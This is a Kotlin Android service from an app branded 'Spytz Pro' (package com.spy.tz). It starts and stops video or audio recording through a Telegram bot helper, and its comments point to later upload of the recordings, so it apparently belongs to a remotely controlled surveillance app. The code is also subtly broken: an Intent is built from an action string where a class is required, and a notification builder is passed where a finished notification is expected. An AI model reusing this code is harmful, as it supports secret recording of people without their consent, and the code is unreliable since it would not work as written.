package com.spy.tz

import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Intent
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.launch

class NotificationService : Service() {

    private var serviceJob: Job? = null
    private var isRecording = false
    private var recordingType: String = "" // "VIDEO" or "AUDIO"
    private lateinit var telegramBotHelper: TelegramBotHelper

    companion object {
        const val CHANNEL_ID = "Spytz_Service_Channel"
        const val NOTIFICATION_ID = 1
        const val ACTION_STOP_RECORDING = "com.spy.tz.STOP_RECORDING"
    }

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        telegramBotHelper = TelegramBotHelper(this)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            "START_VIDEO" -> {
                isRecording = true
                recordingType = "VIDEO"
                startForeground(NOTIFICATION_ID, createNotification("Video Recording...", true))
            }
            "START_AUDIO" -> {
                isRecording = true
                recordingType = "AUDIO"
                startForeground(NOTIFICATION_ID, createNotification("Voice Recording...", true))
            }
            ACTION_STOP_RECORDING -> {
                stopRecordingAndNotify()
            }
        }
        return START_STICKY
    }

    private fun stopRecordingAndNotify() {
        isRecording = false
        if (recordingType == "VIDEO") {
            val file = telegramBotHelper.stopVideoRecording()
            // Here you can trigger upload logic from your Main Activity or Bot Handler
            // For now, we just log it. You should expose a callback or broadcast.
            android.util.Log.d("NotificationService", "Video Stopped. File: $file")
        } else if (recordingType == "AUDIO") {
            val file = telegramBotHelper.stopVoiceRecording()
            android.util.Log.d("NotificationService", "Audio Stopped. File: $file")
        }
        
        stopForeground(true)
        stopSelf()
    }

    private fun createNotification(title: String, showProgress: Boolean): NotificationCompat.Builder {
        val intent = Intent(this, ACTION_STOP_RECORDING).apply {
            `package` = packageName
        }
        
        val pendingIntent = PendingIntent.getService(
            this,
            0,
            intent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )

        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Spytz Pro - ${if(recordingType=="VIDEO") "Video" else "Audio"} Rec")
            .setContentText(title)
            .setSmallIcon(R.drawable.ic_notification) // Ensure you have an icon in res/drawable
            .addAction(android.R.drawable.ic_menu_close_clear_cancel, "Stop", pendingIntent)
            .setPriority(NotificationCompat.PRIORITY_HIGH)
            .setOngoing(true)
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Spytz Background Service",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Shows recording status"
            }
            val notificationManager = getSystemService(NOTIFICATION_SERVICE) as NotificationManager
            notificationManager.createNotificationChannel(channel)
        }
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }
}
